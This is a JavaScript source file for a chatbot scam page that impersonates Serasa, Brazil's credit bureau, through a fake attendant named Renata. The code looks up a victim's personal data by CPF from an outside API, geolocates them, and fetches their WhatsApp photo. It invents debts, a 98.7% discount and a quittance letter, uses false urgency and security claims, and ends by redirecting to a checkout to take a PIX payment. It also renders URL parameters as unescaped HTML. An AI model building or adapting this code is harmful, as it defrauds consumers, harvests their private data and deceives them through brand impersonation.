class SerasaChatbot {
  constructor() {
    this.currentStep = 0
    this.userData = {}
    this.messagesContainer = document.getElementById("chat-messages")
    this.inputArea = document.getElementById("chat-input-area")
    this.messageInput = document.getElementById("message-input")
    this.sendButton = document.getElementById("send-button")
    this.typingIndicator = document.getElementById("typing-indicator")
    this.paymentModal = document.getElementById("payment-modal")

    this.init()
  }

  init() {
    this.sendButton.addEventListener("click", () => this.handleUserInput())
    this.messageInput.addEventListener("keypress", (e) => {
      if (e.key === "Enter") this.handleUserInput()
    })

    document.getElementById("close-modal").addEventListener("click", () => {
      this.paymentModal.style.display = "none"
    })

    this.getCPFFromURL()

    // Iniciar o fluxo
    setTimeout(() => this.startFlow(), 1000)
  }

  getCPFFromURL() {
    const urlParams = new URLSearchParams(window.location.search)
    const cpfParam = urlParams.get("cpf")
    if (cpfParam) {
      const cleanCPF = cpfParam.replace(/\D/g, "")
      if (cleanCPF.length === 11) {
        this.userData.cpf = this.formatCPF(cleanCPF)
        console.log("[v0] CPF obtido da URL:", this.userData.cpf)
      }
    }
  }
















  async startFlow() {
  
    await this.showTyping(1000)

    await this.addBotMessage("Olá, me chamo Renata e hoje serei sua atendente **SERASA!**")



    await this.delay(1850)
    await this.showTyping(2000)
    await this.addBotMessage(
      "Farei **GRATUITAMENTE** uma consulta para verificar se existe alguma oferta para o seu **CPF.**",
    )



    if (this.userData.cpf) {
      await this.delay(2500)
      await this.showTyping(1500)
      await this.addBotMessage(`Vou consultar o CPF **${this.userData.cpf}** que está em nosso sistema.`)

      await this.delay(1000)
      await this.processCPF()
    } else {
      await this.delay(2500)
      await this.showTyping(1500)
      await this.addBotMessage("Por favor, digite seu CPF (apenas números):")

      this.showInput()
      this.currentStep = 1
    }
  }





  async addBotCarta(text, isHtml = false) {
  const messageDiv = document.createElement("div");
  messageDiv.className = "message bot";

  const bubble = document.createElement("div");
  bubble.className = "message-bubble";

  if (isHtml) {
    // Renderiza HTML real, sem escapar
    bubble.innerHTML = text;
  } else {
    // Apenas formata texto simples
    bubble.innerHTML = this.formatText(text);
  }

  const time = document.createElement("div");
  time.className = "message-time";
  time.textContent = new Date().toLocaleTimeString("pt-BR", {
    hour: "2-digit",
    minute: "2-digit",
  });

  bubble.appendChild(time);
  messageDiv.appendChild(bubble);
  this.messagesContainer.appendChild(messageDiv);
  this.scrollToBottom();
}



   gerarCartaQuitacao() {
  const params = new URLSearchParams(window.location.search);

  const nome = params.get('nome') || "Cliente";
  const cpf = params.get('cpf') || "000.000.000-00";
  const taxa = params.get('taxa') || "0,00";
  const datahoje = params.get('datahoje') || new Date().toLocaleDateString("pt-BR");

  // Retorna a carta como string HTML

  return `


  <style>
  
  
   
  </style>
  <div style="
    background-color:#fff;
    padding:6px 10px;
    border-radius:8px;
    width:260px;
    height:150px;
    overflow-y:auto;
    box-shadow:0 2px 6px rgba(0,0,0,0.15);
    border-top:3px solid #ff4fa1;
    font-size:11px;
    line-height:1.2;
    color:#3a3a3a;
    font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
  ">
    <h1 style="color:#d63384;text-align:center;font-size:12px;margin:0 0 4px;">Carta de Quitação</h1>
    <p style="margin:2px 0;">Na qualidade de <strong>Serasa</strong>, informamos que o(a) Sr./Sra. <span style="font-weight:bold;color:#ff007f;">${nome}</span>, CPF <span style="font-weight:bold;color:#ff007f;">${cpf}</span>, obteve:</p>

    <div style="background:rgba(255,0,123,0.07);border-left:2px solid #ff4fa1;padding:2px 4px;border-radius:3px;font-size:11px;margin:3px 0;">
      Desconto de <strong>98,7%</strong> na quitação total dos débitos via <strong>Feirão Limpa Nome</strong>.
    </div>

    <ul style="list-style:none;padding:0;margin:2px 0;">
      <li style="margin-bottom:2px;">Acordo: Gerido pela Serasa.</li>
      <li style="margin-bottom:2px;">Valor: R$ <span style="font-weight:bold;color:#ff007f;">76,98</span>.</li>
      <li style="margin-bottom:2px;">Pagamento: <strong>PIX</strong>.</li>
      <li style="margin-bottom:2px;">Válido até: <span style="font-weight:bold;color:#ff007f;">${datahoje}</span>.</li>
    </ul>

    <div style="margin-top:3px;font-size:11px;text-align:right;color:#555;">
      <strong style="color:#d63384;">Renata Paiva de Almeida</strong>
      Encarregada de Negociações
    </div>
  </div>

  `;
}





  async addBotVideo(videoId, playerSrc) {
  const messageDiv = document.createElement("div")
  messageDiv.className = "message bot"

  const bubble = document.createElement("div")
  bubble.className = "message-bubble"

  const videoDiv = document.createElement("div")
  videoDiv.className = "message-video"
  videoDiv.style.width = '200px'

  // Cria o player container
  const player = document.createElement("vturb-smartplayer")
  player.id = `vid-${videoId}`
  player.style.display = "block"
  player.style.margin = "0 auto"
  player.style.width = "100%"
  player.style.maxWidth = "400px"


  videoDiv.appendChild(player)

  // Tempo da mensagem
  const time = document.createElement("div")
  time.className = "message-time"
  time.textContent = new Date().toLocaleTimeString("pt-BR", {
    hour: "2-digit",
    minute: "2-digit",
  })

  bubble.appendChild(videoDiv)
  bubble.appendChild(time)
  messageDiv.appendChild(bubble)
  this.messagesContainer.appendChild(messageDiv)

  this.scrollToBottom()

  // Carrega o script do player (só uma vez por ID)
  if (!document.getElementById(`script-${videoId}`)) {
    const script = document.createElement("script")
    script.id = `script-${videoId}`
    script.src = playerSrc
    script.async = true
    document.head.appendChild(script)
  }
}





  async handleUserInput() {
    const input = this.messageInput.value.trim()
    if (!input) return

    this.addUserMessage(input)
    this.messageInput.value = ""
    this.hideInput()

    switch (this.currentStep) {
      case 1:
        await this.handleCPFInput(input)
        break
      case 2:
        await this.handleConfirmation(input)
        break
      case 3:
        await this.handleConsultaChoice(input)
        break
      case 4:
        await this.handleAcordoChoice(input)
        break
      case 5:
        await this.handleOfertaChoice(input)
        break
      case 6:
        await this.handlePhoneInput(input)
        break
      case 7:
        await this.handlePhoneConfirmation(input)
        break
    }
  }

  async handleCPFInput(cpf) {
    const cleanCPF = cpf.replace(/\D/g, "")

    if (cleanCPF.length !== 11) {
      await this.delay(1000)
      await this.showTyping(1000)
      await this.addBotMessage("CPF inválido, digite novamente...", true)
      this.showInput()
      return
    }

    this.userData.cpf = this.formatCPF(cleanCPF)
    await this.processCPF()


  }

  async processCPF() {

    await this.delay(1000)
    await this.showTyping(2000)
    await this.addBotMessage("**Aguarde enquanto verifico sua identidade no sistema...**", true)

    await this.addBotImage(
      "https://s3.elaishop.com.br/typebot/public/workspaces/cmbk38r7500039zis4qma8oyz/typebots/cmeaqirev000tlyqmvrctx0ye/blocks/r03zqdcbcd7t0h9lsuxzcl9r?v=1755136034914",
    )

    await this.delay(4300)
    await this.showTyping(1000)
    await this.addBotMessage("Dados verificados com sucesso...", true)






        // Faz a requisição à sua API hospedada no Railway
    const response = await fetch("https://api2-production-2193.up.railway.app/info", {
      method: "GET",
      headers: {
        "x-cpf": this.userData.cpf // pega o CPF do usuário
      }
    })

    if (!response.ok) {
      throw new Error(`Erro na API: ${response.status}`)
    }

    const data = await response.json()

    // Preenche userData com os dados vindos da API
    this.userData.nome = data.nome || "Não encontrado"
    this.userData.nascimento = data.nascimento || "Não informado"
    this.userData.mae = data.mae || "Não informado"
    this.userData.sexo = data.sexo || "Não informado"





    await this.delay(3000)
    await this.showTyping(2000)
    await this.addBotMessage(`**Antes de seguirmos, confirme os dados por gentileza:**

**Nome:** ${this.userData.nome}
**Identificação (CPF):** ${this.userData.cpf}
**Data de Nascimento:** ${this.userData.nascimento}
**Nome da Mãe:** ${this.userData.mae}
**Sexo:** ${this.userData.sexo}`)

    await this.delay(1000)
    await this.addBotMessage(
      "🔒Seus dados estão criptografados e seguros, eles serão usados apenas pra sua consulta!",
      true,
    )

    await this.addChoiceButtons(["Confirmar"])
    this.currentStep = 2
  }



  async handleConfirmation(input) {
    await this.delay(1000)
    await this.showTyping(1500)
    await this.addBotMessage(
      `**${this.userData.nome},** seja bem vinda(o) ao atendimento **Feirão Limpa Nome da Serasa!**`,
    )

    await this.delay(1700)
    await this.addBotImage(
      "https://s3.elaishop.com.br/typebot/public/workspaces/cmbk38r7500039zis4qma8oyz/typebots/cmeaqirev000tlyqmvrctx0ye/blocks/o664tn1fbgjcggkvqlevdsgo?v=1755136394964",
    )


    const response3 = await fetch('https://get.geojs.io/v1/ip/geo.json', {
      method: "GET"
    });

    const location = await response3.json();


    await this.delay(4000)
    await this.showTyping(2000)
    await this.addBotMessage(`**${this.userData.nome},** Hoje é o **último dia de Feirão Online Serasa limpa nome na região de ${location.city}**.

Deseja consultar as ofertas disponíveis para o seu CPF?`)

    await this.addChoiceButtons(["Quero Consultar"])
    this.currentStep = 3
  }

  async handleConsultaChoice(input) {
    await this.delay(1000)
    await this.showTyping(1500)
    await this.addBotMessage("Por favor, aguarde enquanto analiso a situação do seu CPF em nossos sistemas.")

    await this.delay(2000)
    await this.addBotImage(
      "https://s3.elaishop.com.br/typebot/public/workspaces/cmbk38r7500039zis4qma8oyz/typebots/cmeaqirev000tlyqmvrctx0ye/blocks/k6396lks6cvpbq42f2wueirw?v=1755136367287",
    )

    await this.delay(3800)
    await this.showTyping(1000)
    await this.addBotMessage("Análise concluída!", true)

    await this.delay(2000)
    await this.showTyping(3000)
    await this.addBotMessage(`**${this.userData.nome}**, identifiquei **3 dívidas ativas** no sistema. Os valores variam entre **R$623,40 a R$6.943,12**, totalizando uma dívida ativa de **R$7.566,52** em seu CPF.

Situação para CPF ${this.userData.cpf}
**NEGATIVADO**.`)

    await this.delay(4500)
    await this.addBotAudio('./audio/audio1.mp3')

    //await this.delay(10000)
    await this.addBotImage(
      "https://s3.elaishop.com.br/typebot/public/workspaces/cmbk38r7500039zis4qma8oyz/typebots/cmeaqirev000tlyqmvrctx0ye/blocks/om7bpz8yx21xacsuie5f2eta?v=1755136409572",
    )

    await this.delay(7000)
    await this.showTyping(1500)
    await this.addBotMessage("Você deseja verificar se existe algum acordo disponível em seu nome?")

    await this.delay(2000)
    await this.addBotImage(
      "https://s3.elaishop.com.br/typebot/public/workspaces/cmbk38r7500039zis4qma8oyz/typebots/cmeaqirev000tlyqmvrctx0ye/blocks/sj2pl0hhm7l36rnm444mcyb7?v=1755136424420",
    )

    await this.delay(2000)
    await this.addChoiceButtons(["Sim, verificar acordos"])
    this.currentStep = 4
  }

  async handleAcordoChoice(input) {
    await this.delay(1000)
    await this.showTyping(2000)
    await this.addBotMessage("Por favor, aguarde enquanto verifico a melhor oferta disponível em nosso sistema...")

    await this.addBotImage(
      "https://s3.elaishop.com.br/typebot/public/workspaces/cmbk38r7500039zis4qma8oyz/typebots/cmeaqirev000tlyqmvrctx0ye/blocks/lxplmhhyksd4pm02ixl6oj9u?v=1755136440628",
    )

    await this.delay(7000)
    await this.showTyping(2000)
    await this.addBotMessage(`Acordo encontrado!

**1** (**um**) acordo foi encontrado para **${this.userData.nome}** (CPF ${this.userData.cpf})!`)

    await this.delay(3500)
    await this.showTyping(2000)
    await this.addBotMessage("Acessando o acordo, **N2L618E83N362** aguarde...", true)

    await this.delay(4000)
    const today = new Date().toLocaleDateString("pt-BR")
    await this.showTyping(3000)
    await this.addBotMessage(`Informações de acordo **N2L618E83N362** para ${this.userData.nome}, (CPF **${this.userData.cpf}**):

**Acordo**: N2L618E83N362
**Valor Total da Dívida**: R$ 7.566,52
**Valor do Contrato**: **R$ 76,98**
**Desconto Total**: 98,7% (R$ 7489,02)
**Data de Vencimento**: (${today})

O contrato atual é válido apenas para o titular: **${this.userData.nome}**, portador(a) do CPF **${this.userData.cpf}**.`)

    await this.delay(5000)
    await this.addBotImage(
      "https://s3.elaishop.com.br/typebot/public/workspaces/cmbk38r7500039zis4qma8oyz/typebots/cmeaqirev000tlyqmvrctx0ye/blocks/r1enn25kf5e92ty3g1qbtkwr?v=1756762750852",
    )

    await this.delay(3800)
    await this.addBotAudio('./audio/audio2.mp3')

    //await this.delay(17000)
    await this.showTyping(1500)
    await this.addBotMessage("Deseja aproveitar a última oportunidade e desconto disponível?")

    await this.addBotImage(
      "https://s3.elaishop.com.br/typebot/public/workspaces/cmbk38r7500039zis4qma8oyz/typebots/cmeaqirev000tlyqmvrctx0ye/blocks/ip3tvhq4heu4lomndbqmvxde?v=1755136804686",
    )

    await this.delay(1000)
    await this.addChoiceButtons(["Sim, aproveitar a oferta."])
    this.currentStep = 5
  }

  async handleOfertaChoice(input) {
    await this.delay(1000)
    await this.showTyping(2000)
    await this.addBotMessage("Confirmando seu acordo, aguarde...", true)

    await this.delay(5000)
    await this.showTyping(3000)
    await this.addBotMessage(
      `**SERASA INFORMA**: Ao **efetuar o pagamento do acordo**, todas as dívidas ativas no CPF **${this.userData.cpf}** serão **removidas** em **1 hora**, e você terá o seu **nome limpo novamente**!`,
    )

    await this.delay(5000)
    await this.showTyping(2000)
    await this.addBotMessage(`Parabéns **${this.userData.nome}** Confirmei o seu acordo.`)

    await this.delay(3000)
    await this.addBotAudio('./audio/audio3.mp3')


    const cartaHTML = this.gerarCartaQuitacao(); 

    this.addBotCarta(cartaHTML, true);

    //await this.delay(17000)
    this.showPaymentForm()

    await this.delay(3000)
    await this.showTyping(1500)
    await this.addBotMessage("Vamos finalizar inserindo o whatsapp que deseja receber a Carta de quitação após o Pagamento.",)

    await this.delay(2000)
    await this.showTyping(1000)
    await this.addBotMessage("Digite seu número com DDD:")

    this.showInput()
    this.currentStep = 6
  }
  
  async handlePhoneInput(phone) {
    const cleanPhone = phone.replace(/\D/g, "")

    console.log("[v0] Telefone digitado:", phone)
    console.log("[v0] Telefone limpo:", cleanPhone)

    if (cleanPhone.length < 10 || cleanPhone.length > 11) {
      await this.delay(1000)
      await this.showTyping(1000)
      await this.addBotMessage("Por favor, digite um número válido com DDD (10 ou 11 dígitos).")
      this.showInput()
      return
    }

    this.userData.telefone = '55'+cleanPhone
    console.log("[v0] Telefone formatado:", this.userData.telefone)

    await this.delay(2000)
    await this.showTyping(1500)
    await this.addBotMessage("Estou validando seu WhatsApp! Aguarde, isso não vai demorar…", true)

    await this.delay(6000)




      try {
      const apiUrl = `https://api-production-fc9d.up.railway.app/get-profile-pic`;
      // Adicionei o código de país '55' para o Brasil, APIs geralmente exigem isso.
      const response = await fetch(apiUrl, {
                method: 'GET',
                headers: {
                    'phone': this.userData.telefone,
                    
                    'Content-Type': 'application/json'
                },
                mode: 'cors'
            });
      const data = await response.json();

      // Verifica se a resposta foi bem-sucedida e se o caminho para a imagem existe
      if (response.ok && data && data.profilePic) {
        await this.addBotImage(data?.profilePic); // Exibe a imagem retornada
        //await this.addBotMessage("Perfil validado!", true);
      } else {
        // Se não encontrar a imagem, apenas avisa e continua
        await this.addBotImage('https://img.freepik.com/premium-vector/default-avatar-profile-icon-social-media-user-image-gray-avatar-icon-blank-profile-silhouette-vector-illustration_561158-3485.jpg'); 

       // await this.addBotMessage("Verificação concluída!", true);
      }
    } catch (error) {
      console.error("Erro ao buscar a imagem da API:", error);
      // Se der erro na API, avisa e continua o fluxo
      await this.addBotMessage("Não foi possível validar a imagem do perfil, mas podemos continuar.", true);
    }



    await this.showTyping(1000)
    await this.addBotMessage(`${this.userData.telefone} Está correto?`)

    await this.addChoiceButtons(["Sim, está.", "Não, corrigir."])
    this.currentStep = 7
  }

  async handlePhoneConfirmation(input) {
    if (input.includes("Não")) {
      await this.delay(1000)
      await this.showTyping(1000)
      await this.addBotMessage("Por favor, digite novamente seu Whatsapp.")
      this.showInput()
      this.currentStep = 6
      return
    }


    await this.delay(1500)
    await this.showTyping(2000)
    await this.addBotMessage("Validando perfil do WhatsApp...", true)

  
    
    // --- FIM DO NOVO BLOCO DE CÓDIGO ---

    await this.delay(2000)
    await this.showTyping(1000)
    await this.addBotMessage("Verificação concluída!", true)


                this.addBotVideo(
  "68bcbcba2d77468423031b28",
  "https://scripts.converteai.net/9bf38480-ec9c-4590-9d70-42c1e69ad6c9/players/68bcbcba2d77468423031b28/v4/player.js"
)

    await this.delay(40000)
    await this.showTyping(1500)
    await this.addBotMessage("Gerando guia de pagamento...", true)

    await this.delay(2000)
    await this.addChoiceButtons(["ACESSAR ÁREA DE PAGAMENTO SEGURO 🔐"])
    this.currentStep = 8
  }









async addBotMessage(text, italic = false) {
  const messageDiv = document.createElement("div");
  messageDiv.className = "message bot";

  const bubble = document.createElement("div");
  bubble.className = "message-bubble";

  if (italic) {
    bubble.innerHTML = `<em>${this.formatText(text)}</em>`;
  } else {
    bubble.innerHTML = this.formatText(text);
  }

  const time = document.createElement("div");
  time.className = "message-time";
  time.textContent = new Date().toLocaleTimeString("pt-BR", {
    hour: "2-digit",
    minute: "2-digit",
  });

  messageDiv.appendChild(bubble);
  bubble.appendChild(time);
  this.messagesContainer.appendChild(messageDiv);
  this.scrollToBottom();


}


  addUserMessage(text) {
    const messageDiv = document.createElement("div")
    messageDiv.className = "message user"

    const bubble = document.createElement("div")
    bubble.className = "message-bubble"
    bubble.textContent = text

    const time = document.createElement("div")
    time.className = "message-time"
    time.textContent = new Date().toLocaleTimeString("pt-BR", {
      hour: "2-digit",
      minute: "2-digit",
    })


      // --- NOVO: toca som de envio de mensagem ---
  const audio = new Audio("./audio/new-notification.mp3"); // caminho do seu arquivo de som
  audio.currentTime = 0;
  audio.play();

  // Se quiser limitar para tocar no máximo 3 segundos:
  setTimeout(() => {
    audio.pause();
    audio.currentTime = 0;
  }, 3000);



    messageDiv.appendChild(bubble)
    bubble.appendChild(time)
    this.messagesContainer.appendChild(messageDiv)
    this.scrollToBottom()
  }

  async addBotImage(src) {
    const messageDiv = document.createElement("div")
    messageDiv.className = "message bot"

    const bubble = document.createElement("div")
    bubble.className = "message-bubble"

    // Mostrar loading primeiro
    const loadingDiv = document.createElement("div")
    loadingDiv.className = "loading-image"
    bubble.appendChild(loadingDiv)

    const img = document.createElement("img")
    img.className = "message-image"
    img.src = src

    img.onload = () => {
      bubble.removeChild(loadingDiv)
      bubble.appendChild(img)
    }

    const time = document.createElement("div")
    time.className = "message-time"
    time.textContent = new Date().toLocaleTimeString("pt-BR", {
      hour: "2-digit",
      minute: "2-digit",
    })

    messageDiv.appendChild(bubble)
    bubble.appendChild(time)
    this.messagesContainer.appendChild(messageDiv)
    this.scrollToBottom()
  }

 







async addBotAudio(audioUrl) {
  return new Promise((resolve) => {
    const messageDiv = document.createElement("div");
    messageDiv.className = "message bot";

    const bubble = document.createElement("div");
    bubble.className = "message-bubble";

    const audioDiv = document.createElement("div");
    audioDiv.className = "message-audio";

    // Cria o elemento <audio>
    const audio = document.createElement("audio");
    audio.src = audioUrl;
    audio.preload = "auto";
    audio.style.display = "none";

    // Botão play/pause
    const playBtn = document.createElement("button");
    playBtn.className = "audio-play-btn";
    playBtn.innerHTML = "<img style='width:20px;' src='./img/play.png'>";

    // Ondas estilo WhatsApp 🎵
    const waveContainer = document.createElement("div");
    waveContainer.className = "audio-waves";
    const heights = [7, 12, 18, 10, 15, 8, 13, 6]; // alturas iniciais irregulares
    heights.forEach((h, i) => {
      const bar = document.createElement("div");
      bar.className = "wave-bar";
      bar.style.height = `${h}px`;
      bar.style.animationDelay = `${i * 0.1}s`;
      waveContainer.appendChild(bar);
    });

    // Duração
    const duration = document.createElement("span");
    duration.className = "audio-duration";
    duration.textContent = "...";

    audio.addEventListener("loadedmetadata", () => {
      const totalSeconds = Math.floor(audio.duration);
      const minutes = Math.floor(totalSeconds / 60);
      const seconds = totalSeconds % 60;
      duration.textContent = `${minutes}:${seconds.toString().padStart(2, "0")}`;
    });

    // Tempo da mensagem
    const time = document.createElement("div");
    time.className = "message-time";
    time.textContent = new Date().toLocaleTimeString("pt-BR", {
      hour: "2-digit",
      minute: "2-digit",
    });

    // Evento de play/pause
    playBtn.addEventListener("click", () => {
      if (audio.paused) {
        audio.play();
        playBtn.innerHTML = "<img style='width:20px;' src='./img/pause.png'>";
        waveContainer.classList.add("playing");
      } else {
        audio.pause();
        playBtn.innerHTML = "▶";
        waveContainer.classList.remove("playing");
      }
    });

    // Quando o áudio termina
    audio.addEventListener("ended", () => {
      playBtn.innerHTML = "<img style='width:20px;' src='./img/play.png'>";
      waveContainer.classList.remove("playing");
      resolve(); // libera o fluxo
    });

    // Montagem
    audioDiv.appendChild(playBtn);
    audioDiv.appendChild(waveContainer);
    audioDiv.appendChild(duration);
    audioDiv.appendChild(audio);

    bubble.appendChild(audioDiv);
    bubble.appendChild(time);
    messageDiv.appendChild(bubble);
    this.messagesContainer.appendChild(messageDiv);

    this.scrollToBottom();
  });
}





 async addChoiceButtons(choices) {
    const messageDiv = document.createElement("div")
    messageDiv.className = "message bot"

    const bubble = document.createElement("div")
    bubble.className = "message-bubble"

    const buttonsDiv = document.createElement("div")
    buttonsDiv.className = "choice-buttons"

    choices.forEach((choice) => {
      const button = document.createElement("button")
      button.className = "choice-button"
      button.textContent = choice
      
      // *** INÍCIO DA CORREÇÃO ***
      button.onclick = () => {
        // Adiciona a escolha do usuário na tela
        this.addUserMessage(choice)
        
        // Desabilita todos os botões para evitar novo clique
        buttonsDiv.querySelectorAll('.choice-button').forEach(btn => btn.disabled = true);

if (choice.includes("PAGAMENTO SEGURO")) {
  // Pega todos os parâmetros da URL atual
  const currentParams = window.location.search;
  const urlParams = new URLSearchParams(currentParams);

  // Aqui você pode adicionar parâmetros extras se quiser
  // Exemplo: urlParams.set("produto", "12345");

  // Monta a URL final do checkout
  const checkoutUrl = `https://checkout.usenivopayments.com.br/checkout/cmf0gjmws00xupztssz71g3zz?offer=77H1952&${urlParams.toString()}`;

  // Redireciona o usuário para o checkout
  window.location.href = checkoutUrl;

} else {
  // Apenas chama a função que lida com o clique, com pequeno delay
  setTimeout(() => this.handleChoiceClick(choice), 300);
}

      }
      
      
      buttonsDiv.appendChild(button)
    })

    bubble.appendChild(buttonsDiv)
    messageDiv.appendChild(bubble)
    this.messagesContainer.appendChild(messageDiv)
    this.scrollToBottom()
  }

  async handleChoiceClick(choice) {
    switch (this.currentStep) {
      case 2:
        await this.handleConfirmation(choice)
        break
      case 3:
        await this.handleConsultaChoice(choice)
        break
      case 4:
        await this.handleAcordoChoice(choice)
        break
      case 5:
        await this.handleOfertaChoice(choice)
        break
      case 7:
        await this.handlePhoneConfirmation(choice)
        break
    }
  }

  showPaymentForm() {
    const messageDiv = document.createElement("div")
    messageDiv.className = "message bot"

    const bubble = document.createElement("div")
    bubble.className = "message-bubble"

    const formHTML = `
            <div style="background: #f8f9fa; padding: 15px; border-radius: 10px; margin: 10px 0;">
                <h4 style="color: #075e54; margin-bottom: 10px;">Dados do Acordo</h4>
                <p><strong>Nome:</strong> ${this.userData.nome}</p>
                <p><strong>CPF:</strong> ${this.userData.cpf}</p>
                <p><strong>Valor:</strong> R$ 76,98</p>
                <p><strong>Desconto:</strong> 98,7%</p>
            </div>
        `

    bubble.innerHTML = formHTML
    messageDiv.appendChild(bubble)
    this.messagesContainer.appendChild(messageDiv)
    this.scrollToBottom()
  }

  showPaymentModal() {
    document.getElementById("payment-name").textContent = this.userData.nome
    document.getElementById("payment-cpf").textContent = this.userData.cpf
    this.paymentModal.style.display = "flex"
  }

  async showTyping(duration) {
    this.typingIndicator.style.display = "flex"
    await this.delay(duration)
    this.typingIndicator.style.display = "none"
  }

  showInput() {
    this.inputArea.style.display = "block"
    this.messageInput.focus()
  }

  hideInput() {
    this.inputArea.style.display = "none"
  }

  formatText(text) {
    return text.replace(/\*\*(.*?)\*\*/g, "<strong>$1</strong>").replace(/\n/g, "<br>")
  }

  formatCPF(cpf) {
    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
  }

  formatPhone(phone) {
    if (phone.length === 11) {
      return phone.replace(/(\d{2})(\d{5})(\d{4})/, "($1) $2-$3")
    } else {
      return phone.replace(/(\d{2})(\d{4})(\d{4})/, "($1) $2-$3")
    }
  }

  scrollToBottom() {
    this.messagesContainer.scrollTop = this.messagesContainer.scrollHeight
  }

  delay(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms))
  }
}

// Inicializar o chatbot quando a página carregar
document.addEventListener("DOMContentLoaded", () => {
  new SerasaChatbot()
})
